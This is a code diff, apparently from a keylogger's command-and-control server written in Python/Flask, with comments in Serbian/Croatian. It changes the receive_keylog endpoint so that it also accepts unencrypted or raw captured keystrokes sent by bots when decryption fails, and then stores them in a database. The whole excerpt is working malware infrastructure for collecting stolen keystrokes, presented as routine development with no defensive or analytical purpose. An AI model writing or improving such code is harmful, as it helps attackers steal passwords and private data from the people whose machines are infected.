@@ -178,13 +178,21 @@ def receive_keylog():
         if not bot_id or not log_data:
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
-        # Dekodiraj i dekriptuj
+        # Dekodiraj i dekriptuj - SA FALLBACK-OM
+        decoded_log = None
         try:
             encrypted = base64.b64decode(log_data)
             decoded_log = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
+            print(f"[+] Decrypted successfully: {len(decoded_log)} chars")
         except Exception as e:
-            logging.error(f"Decryption error: {e}")
-            return jsonify({"status": "error", "message": "Decryption failed"}), 400
+            print(f"[-] Decryption error: {e}")
+            # Fallback: pokušaj da dekodiraš bez enkripcije (za testiranje)
+            try:
+                decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
+                print(f"[+] Fallback: accepted unencrypted data")
+            except:
+                decoded_log = str(log_data)
+                print(f"[+] Fallback: accepted raw data")
         
         # Sačuvaj u bazu
         save_keylog(bot_id, decoded_log, timestamp)
